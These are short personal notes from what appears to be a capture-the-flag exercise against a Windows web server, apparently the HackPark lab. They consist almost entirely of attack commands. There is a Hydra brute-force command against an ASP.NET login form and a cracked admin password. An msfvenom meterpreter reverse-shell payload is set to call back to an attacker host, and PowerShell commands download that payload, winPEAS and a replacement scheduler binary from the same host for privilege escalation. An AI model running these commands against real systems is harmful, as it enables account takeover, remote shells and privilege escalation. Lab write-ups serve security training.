# Hydra Bruiteforcing

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.222.224 http-post-form "/Account/login.aspx:__VIEWSTATE=X%2Fz3Mlty62z5Y8aCAMiDaFe%2B9SKdcf9226N9xQ01mq8rP30ZJRq5G7EwUwzkz3n9rzEXVYmhE%2BBRVjtKpusOG%2BclmdkWeaN46I%2FnUYO4uzqLV1jka6wmsfIKFhEdwy3oeh7DlUj8VUnfKjmAAhl6QNzNfhdXj13D13LFPh9wtvnHyBjYmqMzxEvWAL1mwoNVWxVTCra5DFu1l1gLSNfWkrXLzo7bQdYCnhV2xxpLa1JgaLGsxDUS3h25czmU7g3MCciYGEAgFFxv%2FATyhDiIQBlHJ154WMYnL52cM7MR81pZZNgK32WdRwy%2FvA2wQvi6YrjkLrEZsiepbdoKvQHZ6qqyPxH0j6K9BI3%2FlKKiT2cfS1Nm&__EVENTVALIDATION=tbMSuN0fZZiffwoWR2502NvWLKSDwmGhtVGh9KB%2FIf6hdNVf9UjamY4uMbjjKFAInyLeK%2Fz5%2ByO1yrvO44pVUZTCisUdcMS2k59fRgxCJ9mU9waI%2BiHVLyhzWS22LViSMdGRUhHURt84Cg9MNCxXY172nJrVA5WtJ7PavxhpRlqV8Wi3&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

admin:1qaz2wsx

Version : 3.3.6.0

Exploitdb Exploit : Directory Traversal / RCE

Netcat shell

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.82.254 LPORT=8888 -f exe -o payload.exe

powershell -C "Invoke-WebRequest -Uri 'http://10.8.82.254:8000/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"

# metaploit meterpreter session

powershell -C "Invoke-WebRequest -Uri 'http://10.8.82.254:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"

powershell -C "Invoke-WebRequest -Uri 'http://10.8.82.254:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"

Walkthrough : https://www.secjuice.com/thm-hack-park/